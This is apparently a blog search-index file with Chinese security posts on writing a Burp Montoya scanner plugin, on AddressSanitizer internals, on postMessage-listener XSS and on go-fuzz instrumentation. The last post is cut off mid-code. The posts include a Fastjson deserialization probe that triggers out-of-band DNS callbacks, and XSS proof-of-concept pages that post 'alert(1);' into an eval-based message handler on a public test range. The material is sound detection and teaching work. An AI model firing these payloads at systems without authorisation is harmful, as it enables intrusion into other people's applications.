<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Burp-Montoya</title>
    <url>//post/Burp-Montoya.html</url>
    <content><![CDATA[  Burp的新版本更新了新的API接口，刚好最近有写插件的想法，所以简单的了解了下。

简介  单从文档界面来看，结构清晰了不少-&gt;MontoyaApi

  同时官方提供了一个demo
使用  与老版本类似，创建一个插件项目需要继承类BurpExtension，它只包含了一个初始化函数
public interface BurpExtension {
    void initialize(MontoyaApi var1);
}

  同样的，想要调用扫描等功能，也需要进行注册，比如我们注册一个扫描
public void initialize(MontoyaApi montoyaApi) {
    this.montoyaApi = montoyaApi;
    montoyaApi.scanner().registerScanCheck(new FastjsonCheck());
}

public class FastjsonCheck implements ScanCheck {
    @Override
    public List&lt;AuditIssue&gt; activeAudit(HttpRequestResponse httpRequestResponse, AuditInsertionPoint auditInsertionPoint) {
        return null;
    }
    @Override
    public List&lt;AuditIssue&gt; passiveAudit(HttpRequestResponse httpRequestResponse) {
        return null;
    }
    @Override
    public ConsolidationAction consolidateIssues(AuditIssue auditIssue, AuditIssue auditIssue1) {
        return null;
    }
}

  与之前类似，activeAudit主动，passiveAudit被动，consolidateIssues定义重复问题的展示规则。具体扫描逻辑与旧版本就大同小异了，不过新版本调用某些方法变得更加方便了，比如调用collaborator:
CollaboratorClient collaboratorClient = montoyaApi.collaborator().createClient();
//生成域名链接
String payload = collaboratorClient.generatePayload().toString();
//访问域名操作
......
//检查记录
List&lt;Interaction&gt; interactions = collaboratorClient.getAllInteractions();

  报告的展示与旧版本基本相同，感觉只是变了名称
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.MarkedHttpRequestResponse;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueDefinition;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;

import java.util.Arrays;
import java.util.List;

/**
 * @program: BurpMontoya
 * @description:
 * @author: Noel
 * @create: 2022-09-21 01:35
 **/
public class ExampleAudit implements AuditIssue {
    private String name;
    private String detail;
    private HttpService httpService;
    private MarkedHttpRequestResponse[] requestResponses;
    private AuditIssueConfidence confidence;
    private AuditIssueSeverity severity;
    private String baseurl;

    public ExampleAudit(String name, String detail, HttpService httpService, MarkedHttpRequestResponse[] requestResponses, AuditIssueSeverity severity, AuditIssueConfidence confidence, String baseurl){
        this.name = name;
        this.detail = detail;
        this.httpService = httpService;
        this.requestResponses = requestResponses;
        this.severity = severity;
        this.confidence = confidence;
        this.baseurl = baseurl;
    }



    @Override
    public String name() {
        return name;
    }

    @Override
    public String detail() {
        return detail;
    }

    @Override
    public String remediation() {
        return null;
    }

    @Override
    public HttpService httpService() {
        return httpService;
    }

    @Override
    public String baseUrl() {
        return baseurl;
    }

    @Override
    public AuditIssueSeverity severity() {
        return severity;
    }

    @Override
    public AuditIssueConfidence confidence() {
        return confidence;
    }

    @Override
    public List&lt;MarkedHttpRequestResponse&gt; requestResponses() {
        return Arrays.asList(requestResponses);
    }

    @Override
    public AuditIssueDefinition definition() {
        return null;
    }

}

  这些结合起来便可以完成一个Burp插件的开发了
实例  前段时间出了Fastjson 1.2.80的利用与检测方式，刚好我们拿来做一个Fastjson检测的插件,payload如下:
[
    {
        "@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",
        "x":{
            "@type":"java.net.InetSocketAddress"{"address":,"val":"80.DNS"} //  fastjson &lt; 1.2.83
        }
    },
    {
        "@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",
        "message":{
            "@type":"java.net.InetSocketAddress"{"address":,"val":"83_.DNS"} // fastjson = 1.2.83
        }
    }
]

  如果 fastjson版本低于1.2.83，DNS只会收到一个80开头的请求，方便我们进行版本判断。我们的检测思路就是遇到json格式的body或者param就全部替换为payload，具体操作如下：

获取请求详情

HttpRequest request = httpRequestResponse.httpRequest();

获取参数
List&lt;ParsedHttpParameter&gt; parameters = request.parameters();


判断参数值是否为json格式

//utilities.urlUtils包含了对URL处理的函数，这里使用了decode，对URL进行解码
utilities.urlUtils().decode(p.value()).startsWith("{") ||utilities.urlUtils().decode(p.value()).startsWith("[") 


生成collaboratorClient并发送请求

//生成collaborator链接
String payload = collaboratorClient.generatePayload().toString();

// poc
private String Fastjson_Payload = "[\n" +
        "    {\n" +
        "        \"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\n" +
        "\t\t\"x\":{\n" +
        "\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fastjson80.%s\"} \n" +
        "\t\t}\n" +
        "    },\n" +
        "    {\n" +
        "        \"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\n" +
        "\t\t\"message\":{\n" +
        "\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fastjson83.%s\"} \n" +
        "\t\t}\n" +
        "    }\n" +
        "]";
//更新参数为我们的poc
HttpRequest rq = request.withUpdatedParameters(HttpParameter.parameter(p.name(),utilities.urlUtils().encode(String.format(Fastjson_Payload, payload, payload)), p.type()));

//发送请求
HttpRequestResponse httpRequestResponse1 = http.issueRequest(rq);


判断dns中是否包含有fastjson83

// 获取Collaborator服务器中所有与payload有关的请求信息
List&lt;Interaction&gt; interactions = collaboratorClient.getInteractions(InteractionFilter.interactionPayloadFilter(payload));
for (Interaction i :interactions) {
// i.dnsDetails()获取一个DnsDetails的Optional对象，DnsDetails有两个方法，一个是获取dns查询的byte数组 d.query()
// 利用byteUtils().indexOf查询是否包含fastjson83
    flag = i.dnsDetails().filter(d -&gt;
            utilities.byteUtils().indexOf(d.query(), utilities.byteUtils().convertFromString("fastjson83")) &gt; 0
    ).isPresent();

}


问题展示

ExampleAudit auditIssue = new ExampleAudit("Example", "Example detail", request.httpService(),new MarkedHttpRequestResponse[]{httpRequestResponse.withNoMarkers(), httpRequestResponse1.withNoMarkers()}, AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, request.url());
auditIssues.add(auditIssue);

至此一个burp插件算是完成了。
问题DNS  在检测dns记录的时候遇到了一个问题，DNS数据包中.并不是ord('.')的格式

  为了准确识别，采用了fastjson83而非fastjson83.payload
api问题  目前新接口还在不断更新中，不是特别稳定。比如说文档中的DnsDetails会返回ByteArray类型  但是目前最新的burp接口中还是byte[]
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>AddressSanitizer 漏洞检测技术剖析</title>
    <url>//post/AddressSanitizer.html</url>
    <content><![CDATA[AddressSanitizer 漏洞检测技术剖析  类似AFL之类的Fuzzing技术不断强大的一个核心原因就是漏洞检测能力的不断增强，作为AFL这款经典工具的核心，ASAN的漏洞检测核心能力值得关注。
ASAN简介  ASAN其实本身是作为LLVM项目的一部分存在于Clang里面，其作用就是一个强大的内存错误检测器，它由一个编译插桩模块和一个运行时库组成，据官网介绍其可以检测以下类型的漏洞：

Out-of-bounds accesses to heap, stack and globals.
Use-after-free
Use-after-return
Use-after-scpe
Double-free, invalid free
Memory leaks (experimental)
initialization order checking

  ASAN的使用方法非常简单，在进行clang编译的时候加上-fsanitize=address参数，这样ASAN的run time library就会被链接到可执行文件里面，但是ASAN并不支持对于共享库的链接。显而易见的是使用ASAN会导致性能降低，因此需要配合clang的一些优化参数，关于这一部分本文只做简单的使用示范不追究其原理，因为作者在性能优化这块就是个彩笔。ASAN官方Demo：
int main(int argc, char **argv) {
  int *array = new int[100];
  delete [] array;
  return array[argc];  // BOOM
}
// clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer example_UseAfterFree.cc

如果ASAN检测到一个bug之后就会把相关的信息打印出来，同时ASAN也会直接退出，这是因为：

这使得ASAN在编译插桩阶段产生更小更快的代码。
一旦产生内存异常，程序就会进入inconsistent state（大致意思就是跟原来程序员预想的状态不同），这就会导致如果不终止ASAN就可能其在接下来的运行中产生误报。

这就是ASAN的基本用法了，关于使用可以看参考链接。

以下漏洞检测中，如果是简单常用的漏洞类型就不针对漏洞原理进行介绍，可以自行查找资料。

ASAN算法  ASAN主要是检测内存，所以其算法也主要是对内存操作，因此对于ASAN来说，其第一步要做的就是接管目标的内存管理。ASAN的具体做法是通过runtime library替代原有的malloc和free，同时将malloc分配的内存周围的区域标记为red-zones（red-zones内存状态被称为为（poisoned）中毒状态），同时将free掉的内存单独隔离并标记为中毒状态，并且每一次程序访问内存的操作都会被修改为如下：编译前：
*address = ...;  // or: ... = *address;

编译后：
if (IsPoisoned(address)) {
  ReportError(address, kAccessSize, kIsWrite);
}
*address = ...;  // or: ... = *address;

那么此时会存在一些问题：

如何快速实现IsPoisoned？
如何更好的输出错误？
所有的内存访问都应该被检查吗？（本文核心关注点）

ASAN官方专门回答了第三个问题，根据官方的解释，ASAN不应该插桩所有的内存访问，因为在程序的运行过程当中需要大量访问相同位置的内存，如下：
void inc(int *a) {
  (*a)++;
}

此时同时存在对同一个地址的访问和存储操作，事实上对于内存访问错误，只用检测其中的一次操作就够了，而像下面的代码逻辑：
if (...)
  *a = ...
*a = ...

或者：
*a = ...
if (...)
  *a = ...

  其实都是只用检测一次内存访问就够了，还有循环之类的操作，其实没必要对循环内的每一次内存访问全部都插桩处理，还有很多其它的优化情况比如变量的数据流传递过程中，没必要对未发生实际变量内存地址改变的情况下对每次一关于该变量的内存访问都做检查，又或者对于全局常量的内存访问检查很可能是没有意义的。根据官方解释，这些优化目前还没有完全应用到ASAN，有兴趣的可以自行探索一下。
简单说一下ASAN的优化思路之后回到其内存管理，ASAN会将全部的虚拟内存分为两大部分：

Main application memory：这块内存主要用于程序常规的内存分配。
Shadow memory：该内存区域保存着一些元数据，假如Main mem里面的某一个bit的数据被标记为中毒状态，那么在对应的Shadow memory里面都有所记录。

这两种内存相互配合，因此一旦Main mem里面有内存被标记，那么对应的Shadow memory应该被快速计算出来。
shadow_address = MemToShadow(address);
if (ShadowIsPoisoned(shadow_address)) {
  ReportError(address, kAccessSize, kIsWrite);
}

上面代码的意思应该是不允许存在多次中毒标记同一地址。
Main mem和Shadow memory之间的映射关系是8字节的Main mem对应1字节的Shadow memory，这一点应该很好理解，存在这样一种机制的核心作用还是确定那些内存是可访问的，那些内存是不可访问的，关于具体的映射细节可以看这里，非常简单。
接下来介绍，ASAN是如何报告错误的。

复制内存异常地址到rax(eax)
execute ud2 (generates SIGILL) SIGILL是一个signal信号，当处理器遇到非法指令的时候就会发出该信号。该信号中断进程并进行core dump。

  用一个字节编码异常地址访问类型和大小，全部的三个步骤大概需要5-6字节的机器码。通过上述内容已经基本了解堆内存的管理办法，那么栈内存该如何处理呢？Demo：
void foo() {
  char a[8];
  ...
  return;
}

编译插桩后：
void foo() {
  char redzone1[32];  // 32-byte aligned
  char a[8];          // 32-byte aligned
  char redzone2[24];
  char redzone3[32];  // 32-byte aligned
  int  *shadow_base = MemToShadow(redzone1);
  shadow_base[0] = 0xffffffff;  // poison redzone1
  shadow_base[1] = 0xffffff00;  // poison redzone2, unpoison 'a'
  shadow_base[2] = 0xffffffff;  // poison redzone3
  ...
  shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison all
  return;
}

  其处理办法也是类似的，将程序中分配的栈空间周围内存进行标记来观察接下来的代码访问过程中是否会存在内存越界操作。  在整个漏洞检测中除了内存监控算法之外，还有一个比较重要的就是call stack算法，关于call stack，ASAN主要收集以下三个事件相关的stack：

malloc and free
Thread create
Failure

 对于ASAN来说，其收集stack trace相关的信息是利用了LLVM项目里面的另一个工具llvm-symbolizer，llvm-symboilzer的作用是从命令行接收目标文件名和地址，然后打印地址对应的源码位置到标准输出。ASAN利用llvm-symboilzer可以将地址全部符号化，从而实现对stack trace的符号化记录，因此在report error的时候就可以看到更多详细信息。
到此关于ASAN中内存相关的基础算法介绍结束，下面主要剖析具体漏洞类型的检测。
漏洞检测OOB  通过对上述算法的了解我们就能知道OOB的检测来源于ASAN中的red zones算法。
UAF  其实在上面的基本算法介绍完了之后就应该明白其UAF的检测原理，每一次的free之后，ASAN并不会直接释放内存，而是对其进行标记和隔离，那么下一次对释放内存进行访问时就可以被监视到，然后输出错误报告。
UAR  默认条件下ASAN并不检测这个bug，这种类型的漏洞其实也很少被提及，可能是利用条件比较苛刻的原因（个人猜测），可以看下官方demo：
// RUN: clang -O -g -fsanitize=address %t &amp;&amp; ./a.out
// By default, AddressSanitizer does not try to detect
// stack-use-after-return bugs.
// It may still find such bugs occasionally
// and report them as a hard-to-explain stack-buffer-overflow.

// You need to run the test with ASAN_OPTIONS=detect_stack_use_after_return=1

int *ptr;
__attribute__((noinline))
void FunctionThatEscapesLocalObject() {
  int local[100];
  ptr = &amp;local[0];
}

int main(int argc, char **argv) {
  FunctionThatEscapesLocalObject();
  return ptr[argc];
}

  对于这种漏洞的检测，ASAN其实采用的也是类似heap uaf的做法，但是在具体的实现方法上存在的差别还是很大的。对于栈帧比较了解的人应该清楚，一旦一个函数return，那么它的栈就会被回收然后在下一次栈分配的时候被重复利用，如此来看通过red-zones类似的方法显然是行不通的，ASAN的做法是将栈迁移到堆上：未迁移前：
void foo() {
  int local;
  escape_addr(&amp;local);
}

迁移后：
void foo() {
  char redzone1[32];
  int local;
  char redzone2[32+28];
  char *fake_stack = __asan_stack_malloc(&amp;local, 96);
  poison_redzones(fake_stack);  // Done by the inlined instrumentation code.
  escape_addr(fake_stack + 32);
  __asan_stack_free(stack, &amp;local, 96)
}

  __asan_stack_malloc(real_stack, frame_size)函数会从fake stack（ASAN实现的一个thread-local heap-like structure）分配一个大小为framz_size的fake frame，所有的fake frame都来自未被标记为中毒状态的内存，但是如果被使用（如上demo）就会被poison_redzones标记。__asan_stack_free(fake_stack, real_stack, frame_size)函数则会将所有的fake frame标记为中毒状态并进行释放。那么如果存在UAR的时候会因访问被标记为中毒的内存而被检测出异常。  从上面可以看出这种检测方法还是挺消耗内存的，fake stack 分配器会为每个线程分配固定大小的内存，大小从2的6次方到2的16次方字节不等，每个线程对应的内存也会被分成一定数量的chunk，如果chunk被用完，那么接下来的栈分配就会使用程序原本的stack，此时的UAR检测也会实效，因此越好的检测效果就代表越高的内存消耗。
UASUAS同样知名度不高，先看官方Demo：
// RUN: clang -O -g -fsanitize=address -fsanitize-address-use-after-scope \
//    use-after-scope.cpp -o /tmp/use-after-scope
// RUN: /tmp/use-after-scope

// Check can be disabled in run-time:
// RUN: ASAN_OPTIONS=detect_stack_use_after_scope=0 /tmp/use-after-scope

volatile int *p = 0;

int main() {
  {
    int x = 0;
    p = &amp;x;
  }
  *p = 5;
  return 0;
}

  大致意思就是作用域内定义的变量在作用域外被访问，ASAN检测这种漏洞的办法是随着程序的执行流不断的标记被局部变量使用的内存，当执行流到达一个作用域的时候，相关局部变量的内存被标记为good，当执行流到达一个作用域的结尾时，相关内存被标记为bad，看下面的demo：编译前：
void f() {
  int *p;
  if (b) {
    int x[10];
    p = x;
  }
  *p = 1;
}

编译后：
void f() {
  int *p;
  if (b) {
    __asan_unpoison_stack_memory(x);
    int x[10];
    p = x;
    __asan_poison_stack_memory(x);
  }
  *p = 1;
   __asan_unpoison_stack_memory(frame);
}

因为栈是会被复用的，所以在函数return之前必须将相关内存取消中毒标记。
Double free and invalid free参考UAF。
Memory leaks (experimental)  试验级别的先不说，ASAN专门集成了LeakSanitizer来研究这类漏洞的检测，可以参考这里。
initialization order checkingStatic initialization order fiasco，这在C++程序静态全局变量初始化过程中很常见。但是这种漏洞其实比较难以检测，因为C++静态全局变量的初始化出现在Main函数执行之前。至于漏洞模型，其实也很简单，假设在A.cpp和B.cpp里面分别存在两个全局静态类C和D，假设D在初始化过程中依赖C中的某些方法但是D初始化在C之前，那么就可能会导致crash。官方demo：
$ cat tmp/init-order/example/a.cc
#include &lt;stdio.h&gt;
extern int extern_global;
int __attribute__((noinline)) read_extern_global() {
  return extern_global;
}
int x = read_extern_global() + 1;
int main() {
  printf("%d\n", x);
  return 0;
}

$ cat tmp/init-order/example/b.cc
int foo() { return 42; }
int extern_global = foo();

官方demo表明假如foo先初始化，那么就会输出43，否则就会输出1，间接表明了初始化顺序可能导致的一些安全问题。ASAN对于这里漏洞的扫描默认是关闭的，可以参考这里开启，它的检测方式分为很多种：
Loose init-order checking  ASAN的这个检测方式很简单，就是在一个全局变量初始化过程中访问另一个全局变量之前检测要访问的全局变量是否已经完成初始化，但是很明显，这种动态检测在上述demo输出43的时候不会报告错误。
Strict init-order checking  这个只是相对于Loose init-order checking更为严格了，只要进行访问就报告错误，这虽然能发现潜在的错误，但是也可能会触发误报。所以其实这两种方法各有千秋。为了解决这些问题，ASAN的此类漏洞扫描存在黑名单机制，把不想扫描的全局变量可以加入Blacklist来防止误报，但是可能会让漏洞研究人员多花点心思。
参考链接
https://clang.llvm.org/docs/AddressSanitizer.htmlhttps://github.com/google/sanitizers/wiki/AddressSanitizerhttps://isocpp.org/wiki/faq/ctors#static-init-order

]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>EventListener XSS</title>
    <url>//post/EventListener%20XSS.html</url>
    <content><![CDATA[EventListener XSSXSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是DOM型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听postMessage所导致漏洞。首先从事件监听器开始说起
事件监听器事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：
&lt;table id="outside"&gt;
    &lt;tr&gt;&lt;td id="t1"&gt;one&lt;/td&gt;&lt;/tr&gt;
    &lt;tr&gt;&lt;td id="t2"&gt;two&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;script&gt;
function modifyText() {
  var t2 = document.getElementById("t2");
  if (t2.firstChild.nodeValue == "three") {
    t2.firstChild.nodeValue = "two";
  } else {
    t2.firstChild.nodeValue = "three";
  }
}

// 为table添加事件监听器
var el = document.getElementById("outside");
el.addEventListener("click", modifyText, false);
&lt;/script&gt;

以上代码监听了table的click事件，当点击table时会触发modifyText,下面链接列出了所有的事件:
https://developer.mozilla.org/en-US/docs/Web/Events#event_index
这里要说的是postMessage与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下postMessage的介绍：
&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。 https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage
它的用法也很简单：
windows.postMessage(message, targetOrigin, [transfer])


windows是指一个窗口，可以是当前页面的window、window.open返回的窗口对象、iframe的contentWindow属性等

message是要发送的消息，可以是字符串，也可以是json格式

targetOrigin用来指定哪个窗口可以接收到消息，如果为*则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。


发送消息事件可以通过如下方式添加监听事件：
window.addEventListener("message", receiveMessage, false);
function receiveMessage(event)
{
}

当发送信息时就会触发receiveMessage。其中event的属性比较重要的有：

data 即postMessage发送的数据

origin 发送信息窗口的origin


漏洞触发比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码
&lt;html&gt;
  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
      var postMessageHandler = function(msg) {
  var content = msg.data;
  var msgObj = eval(content);

  if (msgObj.isActive) {
    document.write("PostMessage arrived!");
  }
}

window.addEventListener('message', postMessageHandler, false);

    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;

很明显可以看出这个页面在监听到postMessage时会调用eval执行发送的信息，那我们就可以构造payload了
&lt;script&gt;
                    function pocLink() {
                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');
                        let msg = "alert(1);";

                        setTimeout(function(){
                            win.postMessage(msg, '*');
                        }, 5000);
                    }
&lt;/script&gt;
 &lt;a href="#" onclick="pocLink();"&gt;PoC link&lt;/a&gt;         

或者是使用iframe
&lt;script&gt;

  function pocFrame(win) {           
    let msg = "alert(1);";

    win.postMessage(msg, '*');          
  }
&lt;/script&gt;
 &lt;iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" onload="pocFrame(this.contentWindow)"&gt;&lt;/iframe&gt;    

也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个iframe并获取其句柄，用来传递信息。当打开的窗口中存在有message监听，且其触发代码有可利用点时就可以触发漏洞。
工具检测纯手工发现漏洞不可取，Burp的DOM Invader就可以帮助发现此类问题

对于https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval 它可以直接检测出漏洞存在并一键生成POC

为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替postMessage-tracker入手进行分析。 其检测结果展示形式为

平平无奇的一个小框框，相较于DOM Invader的可利用性分析差了许多，不过仅仅了解下原理已然足够了。
它的目录结构非常简单，首先看下mainfest.json

run_at表明注入在css之后，dom构建之前。关键代码在content_script.js当中：

这一段的主要作用就是在添加监听器前判断其类型是否时message，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测Burp在此之上加入了危险函数判断的操作，后续有空的话就给DOM Invader加一个类似的功能练练手吧，日常使用当然还是Burp的香啊~
参考文章
https://github.com/fransr/postMessage-tracker

https://portswigger.net/burp/documentation/desktop/tools/dom-invader


]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>云原生项目Fuzz特点及思考</title>
    <url>//post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html</url>
    <content><![CDATA[Go-fuzz的解析与思考go-fuzz
Go-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。

​        go-fuzz是google开源的一款go语言fuzz框架，它和AFL很大的一个不同是在于，AFL通常通过对未修改的文件的输入进行操作，而go-fuzz需要你编写一个Fuzz函数，go-fuzz通过不断的调用该函数来进行fuzz，前者通常会为每一个输入创建一个新的进程，后者则是不断的调用Fuzz函数因此不需要经常启动或者重启进程。
什么是覆盖引导型Fuzz​        覆盖引导型Fuzz通过代码覆盖率信息来决定一个突变是否有效，如果代码覆盖率增长就保存该输入并对其进行持续变异，否则就丢弃该变异：




源码解析go-fuzz-build模块​        该模块的主要作用在于将需要测试的包信息和测试用例信息打包方便进行测试。

利用PProf进行性能分析
加载选中的go语言包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个fuzz材料包
遍历加载的go语言包里面所有的函数名查找所有的名为Fuzz的函数，同时进行签名认证，但是Fuzz函数的个数应该大于0同时小于等于255
获取环境变量，大多是和go有关的环境变量.
加载go语言标准库
忽略一些标准库中的包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个包，因为没有理由进行fuzz测试，为了避免陷入循环（具体为啥我也不是很清楚）
在/tmp下创建临时文件夹保存需要使用的tools和包
接下来就是很高阶的语法树等的建立过程，这个过程中会使用gatherLiterals获取到你提供的初始材料
获取到需要fuzz的包的具体信息，进而可以生成go-fuzz的元数据
将存储信息的cover.exe和sonar.exe已经metadata打包生成zip文件夹



语法树插桩实现​        go语言不同于C语言可以as等汇编工具来较为方便的实现编译时插桩（具体可以参考AFL的插桩方式），为了实现go语言的编译时插桩，我们首先要了解go语言整体的编译流程：

词法与语法分析
类型检查
中间代码生成
机器码生成

那么其实大致就可以看出比较理想的地方就是词法与语法分析的时候对抽象语法书进行插桩了，同时go标准库也提供了scanner，ast和token等相关库来帮助很好的扫描，解析和创建相关抽象语法树，在整个插桩的过程中其实是把go的包一个个遍历插桩的，然后因为go-fuzz不允许导入main包，其实是因为它在插桩完成之后会自己加入相关的main函数。
​        在go-fuzz-build中实现了结构体File和结构体Sonar，这两个结构体都实现了自己的Visit()函数用来遍历相关的语法树：
type File struct {
    fset     *token.FileSet
    pkg      string
    fullName string
    astFile  *ast.File
    blocks   *[]CoverBlock
    info     *types.Info
}

type Sonar struct {
    fset     *token.FileSet
    fullName string
    pkg      string
    blocks   *[]CoverBlock
    info     *types.Info
}

在整个的build的过程中也会生成coverBin和sonarBin两个文件分别对应上述两个结构体的语法树遍历函数执行结果。
File遍历​        在生成coverBin的时候使用的是File结构体对应的Visit遍历函数，不过在开始遍历之前会通过自身实现的addImport来实现go-fuzz-dep包相关内容的导入：

file.addImport(“go-fuzz-dep”, fuzzdepPkg, “CoverTab”)

func (f *File) addImport(path, name, anyIdent string) {
    newImport := &amp;ast.ImportSpec{
        Name: ast.NewIdent(name),
        Path: &amp;ast.BasicLit{
            Kind:  token.STRING,
            Value: fmt.Sprintf("%q", path),
        },
    }
    impDecl := &amp;ast.GenDecl{
        Lparen: f.astFile.Name.End(),
        Tok:    token.IMPORT,
        Specs: []ast.Spec{
            newImport,
        },
        Rparen: f.astFile.Name.End(),
    }
    // Make the new import the first Decl in the file.
    astFile := f.astFile
    astFile.Decls = append(astFile.Decls, nil)
    copy(astFile.Decls[1:], astFile.Decls[0:])
    astFile.Decls[0] = impDecl
    astFile.Imports = append(astFile.Imports, newImport)

    // Now refer to the package, just in case it ends up unused.
    // That is, append to the end of the file the declaration
    //    var _ = _cover_atomic_.AddUint32
    reference := &amp;ast.GenDecl{
        Tok: token.VAR,
        Specs: []ast.Spec{
            &amp;ast.ValueSpec{
                Names: []*ast.Ident{
                    ast.NewIdent("_"),
                },
                Values: []ast.Expr{
                    &amp;ast.SelectorExpr{
                        X:   ast.NewIdent(name),
                        Sel: ast.NewIdent(anyIdent),
                    },
                },
            },
        },
    }
    astFile.Decls = append(astFile.Decls, reference)
}

观察源码其实逻辑也很简单，首先创建了一个基本声明信息节点来将相关的包导入原本的语法树中，同时为了避免导入包但是未使用，所以导入简单的声明语句。导入完成之后使用ast.Walk()来遍历语法树，该函数会调用File结构体对应的Visit函数。
// 源码太长，只贴部分
func (f *File) Visit(node ast.Node) ast.Visitor {
    switch n := node.(type) {
    case *ast.FuncDecl:
        if n.Name.String() == "init" {
            // Don't instrument init functions.
            // They run regardless of what we do, so it is just noise.
            return nil
        }
    case *ast.GenDecl:
        if n.Tok != token.VAR {
            return nil // constants and types are not interesting
        }

    case *ast.BlockStmt: // {}中间的语句
        // If it's a switch or select, the body is a list of case clauses; don't tag the block itself.
        if len(n.List) &gt; 0 {
            switch n.List[0].(type) {
            case *ast.CaseClause: // switch
                for _, n := range n.List {
                    clause := n.(*ast.CaseClause)
                    clause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false)
                }
                return f
            case *ast.CommClause: // select
                for _, n := range n.List {
                    clause := n.(*ast.CommClause)
                    clause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false)
                }
                return f
            }
        }
        n.List = f.addCounters(n.Lbrace, n.Rbrace+1, n.List, true) // +1 to step past closing brace.
......
}

可以看出在遍历语法树的过程中对节点的类型进行了判断，然后对{}中间的内容进行一个判断和插桩，具体的插桩函数如下：
func (f *File) addCounters(pos, blockEnd token.Pos, list []ast.Stmt, extendToClosingBrace bool) []ast.Stmt {
    // Special case: make sure we add a counter to an empty block. Can't do this below
    // or we will add a counter to an empty statement list after, say, a return statement.
    if len(list) == 0 {
        return []ast.Stmt{f.newCounter(pos, blockEnd, 0)}
    }
    // We have a block (statement list), but it may have several basic blocks due to the
    // appearance of statements that affect the flow of control.
    var newList []ast.Stmt
    for {
        // Find first statement that affects flow of control (break, continue, if, etc.).
        // It will be the last statement of this basic block.
        var last int
        end := blockEnd
        for last = 0; last &lt; len(list); last++ {
            end = f.statementBoundary(list[last])
            if f.endsBasicSourceBlock(list[last]) {
                extendToClosingBrace = false // Block is broken up now.
                last++
                break
            }
        }
        if extendToClosingBrace {
            end = blockEnd
        }
        if pos != end { // Can have no source to cover if e.g. blocks abut.
            newList = append(newList, f.newCounter(pos, end, last)) // 在List里面增加counter计数器
        }
        newList = append(newList, list[0:last]...)
        list = list[last:]
        if len(list) == 0 {
            break
        }
        pos = list[0].Pos()
    }
    return newList
}

假设现在有一个switch的demo
func main() {
    var n = 1
    switch n {
    case 0:
        fmt.Println("this is 0")
    case 1:
        fmt.Println("this is 1")
    }
}

这一步的具体操作就是把每一个case拿出来，然后将case相关的语法树的起始位置和结束位置还有body部分全部传入addCounters，addCounters的逻辑起始也非常简单，如果body为空就直接返回一个Counter的ast.Stmt声明语法树结构，

 Counter是作者自定义的一种插桩计数器，这种计数器主要包括两个部分:

对于每个包的File的结构体都维护了一个*[]CoverBlock，每次增加Counter都会在这个数组里面增加一个CoverBlock里面记录了插桩语法树的位置以及内部是否还包含多少其他声明。
一个是ast.IncDecStmt节点，这个是newCounter()函数的返回值


如果body不为空就找到所有影响控制流的声明，比如if，switch, break ,goto等都会开启或者中断一个新的控制流，找到边界声明之后判断其是否属于刚才的类型：
func (f *File) endsBasicSourceBlock(s ast.Stmt) bool {
    switch s := s.(type) {
    case *ast.BlockStmt:
        // Treat blocks like basic blocks to avoid overlapping counters.
        return true
    case *ast.BranchStmt:
        return true
    case *ast.ForStmt:
        return true
    case *ast.IfStmt:
        return true
    case *ast.LabeledStmt:
        return f.endsBasicSourceBlock(s.Stmt)
    case *ast.RangeStmt:
        return true
    case *ast.SwitchStmt:
        return true
    case *ast.SelectStmt:
        return true
    case *ast.TypeSwitchStmt:
        return true
